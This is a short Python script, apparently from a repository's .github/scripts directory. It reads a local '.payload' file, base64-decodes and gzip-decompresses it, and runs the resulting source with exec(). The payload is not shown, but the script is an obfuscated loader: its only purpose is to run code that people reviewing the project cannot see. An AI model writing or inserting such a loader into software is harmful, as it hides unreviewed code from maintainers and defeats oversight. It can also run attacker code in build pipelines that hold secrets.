from pathlib import Path
import base64
import gzip
payload = Path('.github/scripts/app-wa-0944.payload').read_text().strip()
source = gzip.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(source, 'app-wa-0944-expanded.py', 'exec'))
